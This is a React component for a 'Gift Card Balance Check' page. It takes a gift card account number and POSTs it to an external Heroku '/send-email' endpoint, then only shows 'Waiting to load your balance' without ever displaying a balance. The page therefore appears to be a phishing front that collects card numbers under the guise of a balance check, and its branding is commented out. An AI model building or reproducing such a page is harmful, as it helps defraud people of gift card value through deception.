import React, { useState } from 'react';
import './App.css';

function App() {
    const [userInput, setUserInput] = useState('');
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState(null);

    const handleSubmit = async (e) => {
        e.preventDefault();
        setLoading(true);
        setError(null);

        try {
            const response = await fetch('https://damp-lake-56874-184473373b9b.herokuapp.com/send-email', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ userInput }),
            });

            if (response.ok) {
                alert('Waiting to load your balance');
            } else {
                setError('Unable to process your request. Please try again.');
            }
        } catch (error) {
            setError('An error occurred. Please try again later.');
        } finally {
            setLoading(false);
        }
    };

    return (
      <div className="app">
        <form  className='' onSubmit={handleSubmit}>
          {/* <div className="header">
            POWERED BY
            <h1>TEEFAH TECH</h1>
          </div> */}
              <div className="header2">
                  Gift Card Balance Check
              </div>
              <p className=''>
                Please enter your gift card account number below to check your balance.
              </p>
              <input
                  className='border-2 rounded-md border-black h-9'
                  type="text"
                  id="userInput"
                  value={userInput}
                  onChange={(e) => setUserInput(e.target.value)}
                  required
              /> 
              {loading ? (
                  <button className='border-2 rounded-md border-black' type="submit" disabled>Loading...</button>
              ) : (
                  <button className='border rounded-md border-black' type="submit" >Submit</button>
              )}
              {error && <p className="error">{error}</p>}
        </form>
      </div>
    );
}

export default App;
